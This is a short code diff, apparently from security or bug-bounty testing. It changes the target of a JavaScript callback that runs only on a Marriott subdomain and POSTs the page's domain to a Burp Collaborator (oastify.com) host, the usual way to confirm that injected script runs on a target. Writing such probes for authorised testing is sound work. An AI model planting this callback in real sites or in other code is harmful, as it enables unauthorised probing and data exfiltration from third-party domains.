@@ -1,5 +1,5 @@
 if (document.domain == "cruise-with-points.marriott.com") {
-  fetch('https://unlcfz8eokmjszf1ff83te4gs7yxmm.oastify.com', {
+  fetch('https://a6hsyfru705zbfyhyvrjcunwbnhe53.oastify.com', {
   method: 'POST',
   mode: 'no-cors',
   body:document.domain
